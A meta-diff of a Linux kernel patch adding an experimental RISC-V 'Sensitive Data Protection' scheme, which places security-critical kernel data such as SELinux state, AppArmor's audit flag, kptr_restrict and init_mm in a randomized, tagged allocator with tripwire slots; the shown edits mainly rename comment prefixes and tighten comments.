@@ -11004,16 +10996,8 @@ index 4fa5635bf81b..e258a92819e0 100644
 +}
 +EXPORT_SYMBOL(gen_pool_find_chunk);
 +
-+/**
-+ * gen_pool_free_in_chunk - free memory back to pool given the chunk
-+ * @pool: pool to free to
-+ * @chunk: the chunk the memory belongs to (as returned by gen_pool_find_chunk)
-+ * @addr: starting address of memory to free
-+ * @size: size in bytes of memory to free
-+ *
-+ * Like gen_pool_free, but skips the chunk lookup since the caller already
-+ * knows which chunk the address belongs to.
-+ */
++// gen_pool_free_in_chunk - free [addr, addr+size) back to @pool using @chunk
++// (from gen_pool_find_chunk), skipping gen_pool_free's chunk lookup
 +void gen_pool_free_in_chunk(struct gen_pool *pool, struct gen_pool_chunk *chunk,
 +			 unsigned long addr, size_t size)
 +{
@@ -11035,7 +11019,7 @@ index 4fa5635bf81b..e258a92819e0 100644
   * gen_pool_for_each_chunk - call func for every chunk of generic memory pool
   * @pool:	the generic memory pool
 diff --git a/lib/vsprintf.c b/lib/vsprintf.c
-index afb88b24fa74..16834e5181cb 100644
+index afb88b24fa74..f224030ce539 100644
 --- a/lib/vsprintf.c
 +++ b/lib/vsprintf.c
 @@ -846,13 +846,16 @@ static char *default_pointer(char *buf, char *end, const void *ptr,
@@ -11044,7 +11028,7 @@ index afb88b24fa74..16834e5181cb 100644
  
 -int kptr_restrict __read_mostly;
 +// int kptr_restrict __read_mostly;
-+// FZY: Store the kptr_restrict value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the kptr_restrict value on heap, store its pointer in the global section, and mark it as __tag1
 +int *__tag1 kptr_restrict_ptr;
  
  static noinline_for_stack
@@ -11052,20 +11036,20 @@ index afb88b24fa74..16834e5181cb 100644
  			 struct printf_spec spec)
  {
 -	switch (kptr_restrict) {
-+	// FZY:  Adjust the reference of kptr_restrict
++	// SDP:  Adjust the reference of kptr_restrict
 +	switch (*kptr_restrict_ptr) {
  	case 0:
  		/* Handle as %p, hash and do _not_ leak addresses. */
  		return default_pointer(buf, end, ptr, spec);
 diff --git a/mm/Kconfig b/mm/Kconfig
-index 264a2df5ecf5..40e50e89d6d2 100644
+index 264a2df5ecf5..8659a597019b 100644
 --- a/mm/Kconfig
 +++ b/mm/Kconfig
 @@ -1260,4 +1260,37 @@ config LOCK_MM_AND_FIND_VMA
  
  source "mm/damon/Kconfig"
  
-+# FZY: Kconfig for sdp cache, for random allocation of sensitive data
++# SDP: Kconfig for sdp cache, for random allocation of sensitive data
 +config SDP_CACHE
 +	bool "Sensitive Data Protection Cache"
 +	depends on RISCV && 64BIT
@@ -11077,7 +11061,7 @@ index 264a2df5ecf5..40e50e89d6d2 100644
 +
 +	  If unsure, say N.
 +
-+# FZY: Kconfig for the sdp page table pool, for hidden allocation of page tables
++# SDP: Kconfig for the sdp page table pool, for hidden allocation of page tables
 +config SDP_PGTABLE
 +	bool "Sensitive Data Protection Page Table Pool"
 +	depends on RISCV && 64BIT && MMU && !XIP_KERNEL
@@ -11100,7 +11084,7 @@ index 264a2df5ecf5..40e50e89d6d2 100644
 +
  endmenu
 diff --git a/mm/Makefile b/mm/Makefile
-index ec65984e2ade..f9d9525d39d0 100644
+index ec65984e2ade..f9d114552039 100644
 --- a/mm/Makefile
 +++ b/mm/Makefile
 @@ -138,3 +138,6 @@ obj-$(CONFIG_IO_MAPPING) += io-mapping.o
@@ -11108,10 +11092,10 @@ index ec65984e2ade..f9d9525d39d0 100644
  obj-$(CONFIG_GENERIC_IOREMAP) += ioremap.o
  obj-$(CONFIG_SHRINKER_DEBUG) += shrinker_debug.o
 +
-+# FZY: Build sdp_cache.o
++# SDP: Build sdp_cache.o
 +obj-$(CONFIG_SDP_CACHE) += sdp_cache.o
 diff --git a/mm/init-mm.c b/mm/init-mm.c
-index cfd367822cdd..13dafe4229c2 100644
+index cfd367822cdd..8cc9add4c551 100644
 --- a/mm/init-mm.c
 +++ b/mm/init-mm.c
 @@ -1,4 +1,5 @@
@@ -11124,7 +11108,7 @@ index cfd367822cdd..13dafe4229c2 100644
  #include <linux/iommu.h>
  #include <asm/mmu.h>
  
-+// FZY: Header file for allocating init_mm in sdp_cache
++// SDP: Header file for allocating init_mm in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/init.h>
 +#include <linux/sched/task.h>
@@ -11140,7 +11124,7 @@ index cfd367822cdd..13dafe4229c2 100644
   * Since there is only one init_mm in the entire system, keep it simple
   * and size this cpu_bitmask to NR_CPUS.
   */
-+// FZY: Have a separate __boot_init_mm to simplify the reference of init_mm during init
++// SDP: Have a separate __boot_init_mm to simplify the reference of init_mm during init
 +#ifdef CONFIG_SDP_CACHE
 +struct mm_struct __boot_init_mm = {
 +	.mm_mt		= MTREE_INIT_EXT(mm_mt, MM_MT_FLAGS, __boot_init_mm.mmap_lock),
@@ -11165,7 +11149,7 @@ index cfd367822cdd..13dafe4229c2 100644
 +	INIT_MM_CONTEXT(__boot_init_mm)
 +};
 +
-+// FZY: Store init_mm in sdp_cache and store its pointer in the global section with __tag1
++// SDP: Store init_mm in sdp_cache and store its pointer in the global section with __tag1
 +struct mm_struct *__tag1 __init_mm_ptr = &__boot_init_mm;
 +#else
  struct mm_struct init_mm = {
@@ -11177,7 +11161,7 @@ index cfd367822cdd..13dafe4229c2 100644
  };
 +#endif
  
-+// FZY: Initialize init_mm with __boot_init_mm during init
++// SDP: Initialize init_mm with __boot_init_mm during init
 +#ifdef CONFIG_SDP_CACHE
 +void setup_initial_init_mm(void *start_code, void *end_code,
 +			   void *end_data, void *brk)
@@ -11191,13 +11175,13 @@ index cfd367822cdd..13dafe4229c2 100644
  void setup_initial_init_mm(void *start_code, void *end_code,
  			   void *end_data, void *brk)
  {
-@@ -58,3 +108,58 @@ void setup_initial_init_mm(void *start_code, void *end_code,
+@@ -58,3 +108,54 @@ void setup_initial_init_mm(void *start_code, void *end_code,
  	init_mm.end_data = (unsigned long)end_data;
  	init_mm.brk = (unsigned long)brk;
  }
 +#endif
 +
-+// FZY: Allocate init_mm in sdp_cache
++// SDP: Allocate init_mm in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +static int __init sdp_migrate_init_mm(void)
 +{
@@ -11221,13 +11205,9 @@ index cfd367822cdd..13dafe4229c2 100644
 +		return -ENOMEM;
 +	}
 +
-+	// Copy all fields from the boot-time init_mm.
-+	// FZY: Must be a typed struct assignment, not a memcpy(). Under
-+	// CONFIG_SDP_PGTABLE mm_struct carries a __tag1 field (pgd) and only the
-+	// typed copy lowers it to ld_sdp/sd_sdp; a bytewise memcpy whose size is
-+	// not exactly sizeof(struct mm_struct) falls through to a plain
-+	// ld/sd pair and loses the tag. cpu_bitmap is a flexible array member,
-+	// so it is copied separately.
++	// SDP: Typed struct assignment, not memcpy(): under CONFIG_SDP_PGTABLE only a typed
++	// copy lowers mm_struct's __tag1 pgd to ld_sdp/sd_sdp (a mis-sized memcpy falls to
++	// plain ld/sd and loses the tag). The cpu_bitmap flexible array is copied separately
 +	*new_mm = __boot_init_mm;
 +	memcpy(new_mm->cpu_bitmap, __boot_init_mm.cpu_bitmap, cpumask_size());
 +
@@ -11252,11 +11232,11 @@ index cfd367822cdd..13dafe4229c2 100644
 +#endif
 diff --git a/mm/sdp_cache.c b/mm/sdp_cache.c
 new file mode 100644
-index 000000000000..c14454d50dfc
+index 000000000000..e97f5ff8505d
 --- /dev/null
 +++ b/mm/sdp_cache.c
-@@ -0,0 +1,357 @@
-+// FZY: Implementation of the sdp cache, a random allocator for sensitive data in kernel. Each type of sensitive data has its own sdp_cache, which is randomly placed in the vmalloc/ioremap area backed by a gen_pool.
+@@ -0,0 +1,352 @@
++// SDP: Implementation of the sdp cache, a random allocator for sensitive data in kernel. Each type of sensitive data has its own sdp_cache, which is randomly placed in the vmalloc/ioremap area backed by a gen_pool
 +
 +#include <linux/bitmap.h>
 +#include <linux/genalloc.h>
@@ -11464,7 +11444,7 @@ index 000000000000..c14454d50dfc
 +  return addr;
 +}
 +
-+// FZY: set_tag1/0 on tripwire slots
++// set_tag1/0 on tripwire slots
 +static __always_inline void sdp_tripwire_set_tag(void *slot, u64 ttag, bool is_set)
 +{
 +#ifdef SDP_SD
@@ -11479,18 +11459,13 @@ index 000000000000..c14454d50dfc
 +#endif
 +}
 +
-+/*
-+ * Bit layout of a single prandom value (32 bits):
-+ *   [0..1]   - allocate tripwire? both set → yes (~1/4 probability)
-+ *   [2]      - tripwire placement (0 = before object, 1 = after)
-+ *   [3..18]  - 16-bit TTag value
-+ *   (other bits ignored)
-+ */
++// Bit layout of a prandom value: [0..1] allocate tripwire (both set, ~1/4),
++// [2] placement (0 before, 1 after object), [3..18] 16-bit TTag, rest ignored
 +#define SDP_RND_TRIPWIRE_MASK  3U
 +#define SDP_RND_PLACE_BIT      2
 +#define SDP_RND_TTAG_MASK    0xFFFFU
 +
-+// FZY: Derive a 16-bit tripwire TTag from the sdp_cache pointer with a simple xor-fold
++// Derive a 16-bit tripwire TTag from the sdp_cache pointer with a simple xor-fold
 +static __always_inline u64 sdp_cache_ttag(const struct sdp_cache *cache)
 +{
 +  unsigned long v = (unsigned long)cache;
@@ -11514,7 +11489,7 @@ index 000000000000..c14454d50dfc
 +    if (!addr)
 +      return NULL;
 +
-+    // FZY: Emulate the performance impact of set_tag
++    // Emulate the performance impact of set_tag
 +    memset((void *)addr, 0, obj_size);
 +    return (void *)addr;
 +  }
@@ -11581,7 +11556,7 @@ index 000000000000..c14454d50dfc
 +      tripwire = base;
 +    }
 +
-+    // FZY: Clear the tripwire slots with set_tag0
++    // Clear the tripwire slots with set_tag0
 +    for (size_t i = 0; i < obj_size / sizeof(u64); i++)
 +      sdp_tripwire_set_tag((char *)tripwire + i * sizeof(u64), ttag, 0);
 +
@@ -11591,7 +11566,7 @@ index 000000000000..c14454d50dfc
 +    free_size = obj_size;
 +  }
 +
-+  // FZY: Emulate the performance impact of clear_tag for the tripwire slot
++  // Emulate the performance impact of clear_tag for the tripwire slot
 +  // memset((void *)(base), 0, free_size);
 +
 +  gen_pool_free_in_chunk(cache->pool, chunk, base, free_size);
@@ -18266,7 +18241,7 @@ index 000000000000..bcea651e4856
 +# end of Rust hacking
 +# end of Kernel hacking
 diff --git a/security/apparmor/include/apparmor.h b/security/apparmor/include/apparmor.h
-index 8a81557c9d59..f6360c6eeaf9 100644
+index 8a81557c9d59..673a1b770849 100644
 --- a/security/apparmor/include/apparmor.h
 +++ b/security/apparmor/include/apparmor.h
 @@ -40,7 +40,9 @@
@@ -18275,13 +18250,13 @@ index 8a81557c9d59..f6360c6eeaf9 100644
  /* Control parameters settable through module/boot flags */
 -extern enum audit_mode aa_g_audit;
 +// extern enum audit_mode aa_g_audit;
-+// FZY: Store the aa_g_audit value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the aa_g_audit value on heap, store its pointer in the global section, and mark it as __tag1
 +extern int *__tag1 aa_g_audit;
  extern bool aa_g_audit_header;
  extern bool aa_g_debug;
  extern bool aa_g_hash_policy;
 diff --git a/security/apparmor/include/policy.h b/security/apparmor/include/policy.h
-index 545f791cabda..323c2cdfa192 100644
+index 545f791cabda..1d2282443bdf 100644
 --- a/security/apparmor/include/policy.h
 +++ b/security/apparmor/include/policy.h
 @@ -364,8 +364,9 @@ static inline void aa_put_profile(struct aa_profile *p)
@@ -18290,21 +18265,21 @@ index 545f791cabda..323c2cdfa192 100644
  {
 -	if (aa_g_audit != AUDIT_NORMAL)
 -		return aa_g_audit;
-+	// FZY: Adjust the reference of aa_g_audit
++	// SDP: Adjust the reference of aa_g_audit
 +	if (*aa_g_audit != AUDIT_NORMAL)
 +		return *aa_g_audit;
  
  	return profile->audit;
  }
 diff --git a/security/apparmor/lsm.c b/security/apparmor/lsm.c
-index 108eccc5ada5..e4d2f58ea350 100644
+index 108eccc5ada5..303d064c0459 100644
 --- a/security/apparmor/lsm.c
 +++ b/security/apparmor/lsm.c
 @@ -41,6 +41,11 @@
  #include "include/mount.h"
  #include "include/secid.h"
  
-+// FZY: Include sdp_cache.h to allocate aa_g_audit in sdp_cache
++// SDP: Include sdp_cache.h to allocate aa_g_audit in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -18318,7 +18293,7 @@ index 108eccc5ada5..e4d2f58ea350 100644
  /* Audit mode */
 -enum audit_mode aa_g_audit;
 +// enum audit_mode aa_g_audit;
-+// FZY: Store the aa_g_audit value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the aa_g_audit value on heap, store its pointer in the global section, and mark it as __tag1
 +int *__tag1 aa_g_audit;
  module_param_call(audit, param_set_audit, param_get_audit,
  		  &aa_g_audit, S_IRUSR | S_IWUSR);
@@ -18328,7 +18303,7 @@ index 108eccc5ada5..e4d2f58ea350 100644
  	if (apparmor_initialized && !aa_current_policy_view_capable(NULL))
  		return -EPERM;
 -	return sprintf(buffer, "%s", audit_mode_names[aa_g_audit]);
-+	// FZY: Adjust the reference of aa_g_audit
++	// SDP: Adjust the reference of aa_g_audit
 +	return sprintf(buffer, "%s", audit_mode_names[*aa_g_audit]);
  }
  
@@ -18338,7 +18313,7 @@ index 108eccc5ada5..e4d2f58ea350 100644
  		return -EINVAL;
  
 -	aa_g_audit = i;
-+	// FZY: Adjust the reference of aa_g_audit
++	// SDP: Adjust the reference of aa_g_audit
 +	*aa_g_audit = i;
  	return 0;
  }
@@ -18347,7 +18322,7 @@ index 108eccc5ada5..e4d2f58ea350 100644
  {
  	int error;
  
-+// FZY: Allocate aa_g_audit in sdp_cache
++// SDP: Allocate aa_g_audit in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +	struct sdp_cache *aa_g_audit_cache;
 +	aa_g_audit_cache = sdp_cache_create("aa_g_audit", sizeof(int), cache_line_size());
@@ -18364,7 +18339,7 @@ index 108eccc5ada5..e4d2f58ea350 100644
  	if (error) {
  		AA_ERROR("Unable to setup dfa engine\n");
 diff --git a/security/selinux/hooks.c b/security/selinux/hooks.c
-index 2aa0e219d721..3d6a53f3f98b 100644
+index 2aa0e219d721..3c52ffb736e6 100644
 --- a/security/selinux/hooks.c
 +++ b/security/selinux/hooks.c
 @@ -106,7 +106,13 @@
@@ -18372,12 +18347,12 @@ index 2aa0e219d721..3d6a53f3f98b 100644
  #define SELINUX_INODE_INIT_XATTRS 1
  
 -struct selinux_state selinux_state;
-+// FZY: Include sdp_cache.h for selinux_state protection
++// SDP: Include sdp_cache.h for selinux_state protection
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
 +
-+// FZY: Store the selinux_state struct on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the selinux_state struct on heap, store its pointer in the global section, and mark it as __tag1
 +struct __selinux_state *__tag1 __selinux_state_ptr;
  
  /* SECMARK reference count */
@@ -18387,7 +18362,7 @@ index 2aa0e219d721..3d6a53f3f98b 100644
  	pr_info("SELinux:  Initializing.\n");
  
 -	memset(&selinux_state, 0, sizeof(selinux_state));
-+  // FZY: Allocate selinux_state in sdp_cache
++  // SDP: Allocate selinux_state in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +  struct sdp_cache *selinux_sdp_cache;
 +  selinux_sdp_cache = sdp_cache_create("selinux_state", sizeof(struct __selinux_state), cache_line_size());
@@ -18404,7 +18379,7 @@ index 2aa0e219d721..3d6a53f3f98b 100644
  	selinux_avc_init();
  	mutex_init(&selinux_state.status_lock);
 diff --git a/security/selinux/include/security.h b/security/selinux/include/security.h
-index a9de89af8fdc..b7eba601e646 100644
+index a9de89af8fdc..6f179f3f85da 100644
 --- a/security/selinux/include/security.h
 +++ b/security/selinux/include/security.h
 @@ -89,7 +89,8 @@ extern int selinux_enabled_boot;
@@ -18412,7 +18387,7 @@ index a9de89af8fdc..b7eba601e646 100644
  struct selinux_policy;
  
 -struct selinux_state {
-+// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +struct __selinux_state {
  #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
  	bool enforcing;
@@ -18422,16 +18397,16 @@ index a9de89af8fdc..b7eba601e646 100644
  void selinux_avc_init(void);
  
 -extern struct selinux_state selinux_state;
-+// FZY: Store the selinux_state struct on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the selinux_state struct on heap, store its pointer in the global section, and mark it as __tag1
 +extern struct __selinux_state *__tag1 __selinux_state_ptr;
 +
-+// FZY: Define selinux_state as a macro that dereferences the pointer to avoid changing the code that references selinux_state
++// SDP: Define selinux_state as a macro that dereferences the pointer to avoid changing the code that references selinux_state
 +#define selinux_state (*__selinux_state_ptr)
  
  static inline bool selinux_initialized(void)
  {
 diff --git a/security/selinux/ss/services.c b/security/selinux/ss/services.c
-index 1eeffc66ea7d..16e972b26f11 100644
+index 1eeffc66ea7d..e5164088e04d 100644
 --- a/security/selinux/ss/services.c
 +++ b/security/selinux/ss/services.c
 @@ -2147,7 +2147,8 @@ static void selinux_policy_cond_free(struct selinux_policy *policy)
@@ -18439,7 +18414,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  void selinux_policy_cancel(struct selinux_load_state *load_state)
  {
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *oldpolicy;
  
@@ -18449,7 +18424,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  void selinux_policy_commit(struct selinux_load_state *load_state)
  {
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *oldpolicy, *newpolicy = load_state->policy;
  	unsigned long flags;
@@ -18459,7 +18434,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  			 struct selinux_load_state *load_state)
  {
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *newpolicy, *oldpolicy;
  	struct selinux_policy_convert_data *convert_data;
@@ -18469,7 +18444,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  int security_set_bools(u32 len, int *values)
  {
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *newpolicy, *oldpolicy;
  	int rc;
@@ -18479,7 +18454,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  int selinux_audit_rule_init(u32 field, u32 op, char *rulestr, void **vrule)
  {
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *policy;
  	struct policydb *policydb;
@@ -18489,7 +18464,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  int selinux_audit_rule_match(u32 sid, u32 field, u32 op, void *vrule)
  {
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *policy;
  	struct context *ctxt;
@@ -18499,7 +18474,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  int security_read_policy(void **data, size_t *len)
  {
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *policy;
  
@@ -18509,7 +18484,7 @@ index 1eeffc66ea7d..16e972b26f11 100644
  {
  	int err;
 -	struct selinux_state *state = &selinux_state;
-+	// FZY: Rename selinux_state to __selinux_state to avoid name conflict
++	// SDP: Rename selinux_state to __selinux_state to avoid name conflict
 +	struct __selinux_state *state = &selinux_state;
  	struct selinux_policy *policy;
  
@@ -18687,36 +18662,23 @@ index 000000000000..84a27e70881e
 \ No newline at end of file
 diff --git a/static_instcount.py b/static_instcount.py
 new file mode 100755
-index 000000000000..1fd9dc7e42ae
+index 000000000000..cc7f69948aca
 --- /dev/null
 +++ b/static_instcount.py
-@@ -0,0 +1,276 @@
-+#!/usr/bin/env python3
-+# FZY: Static instruction counter for an SDP-extended RV64 kernel image.
-+#
-+# Mirrors the classification in contrib/plugins/sdp_counter.c so a static
-+# count of the kernel binary is directly comparable to a dynamic snapshot
-+# from the QEMU plugin.
-+#
-+# Categories (one column per):
-+#   all, normal_load, normal_store,
-+#   ld_scp, ld_sdp, sd_scp, sd_sdp,
-+#   set_tag0, set_tag1, clear_tag
-+#
-+# Input: an ELF kernel image (e.g. vmlinux). By default the script runs
-+# riscv64-linux-gnu-objdump -d and classifies every disassembled instruction
-+# by its raw bytes. Lines rendered as `.word` / `.byte` / `.short` / etc. are
-+# data (e.g. the EFI PE-COFF header in .head.text) and are skipped.
-+# `.insn 4, 0xHEX` lines — used by objdump for instructions it doesn't
-+# recognise, including all SDP custom encodings — are classified by their
-+# bytes via the same logic the sdp_counter plugin uses, so SDP opcodes get
-+# bucketed correctly without a patched binutils. With --bytes, the ELF's
-+# executable PT_LOAD segments are byte-scanned directly instead.
-+#
+@@ -0,0 +1,263 @@
++# SDP: Static instruction counter for an SDP-extended RV64 kernel image.
++# Mirrors the classification in contrib/plugins/sdp_counter.c, so a static count
++# is comparable to the plugin's dynamic snapshot.
++# Columns: all, normal_load, normal_store, ld_scp, ld_sdp, sd_scp, sd_sdp,
++# set_tag0, set_tag1, clear_tag.
++# Input: an ELF kernel image (e.g. vmlinux). By default it runs objdump -d and
++# classifies each instruction by its raw bytes; .word/.byte data lines are skipped
++# and `.insn 4, 0xHEX` SDP encodings are bucketed by the same logic as the plugin.
++# With --bytes it scans the executable PT_LOAD segments directly.
 +# Usage:
-+#   ./static_instcount.py vmlinux
-+#   ./static_instcount.py vmlinux --bytes              # force byte scan
-+#   ./static_instcount.py vmlinux --objdump=/path/to/riscv64-objdump
++#  ./static_instcount.py vmlinux
++#  ./static_instcount.py vmlinux --bytes
++#  ./static_instcount.py vmlinux --objdump=/path/to/riscv64-objdump
 +
 +import argparse
 +import re
@@ -18826,14 +18788,14 @@ index 000000000000..1fd9dc7e42ae
 +
 +DEFAULT_OBJDUMP = "riscv64-linux-gnu-objdump"
 +
-+# Mnemonics objdump uses when it considers the bytes to be data, not code.
++# Mnemonics objdump uses when it considers the bytes to be data, not code
 +DATA_DIRECTIVES = frozenset({
 +    ".word", ".byte", ".short", ".half", ".long", ".dword", ".quad",
 +    ".string", ".asciz", ".ascii", ".zero",
 +})
 +
 +# An objdump disassembly line: leading spaces, hex address, ':', whitespace,
-+# a single run of hex (4 or 8 chars for RV64 GC), then optional mnemonic+args.
++# a single run of hex (4 or 8 chars for RV64 GC), then optional mnemonic+args
 +OBJDUMP_LINE_RE = re.compile(
 +    r"^\s*([0-9a-f]+):\s+([0-9a-f]+)(?:\s+(\S.*))?\s*$"
 +)
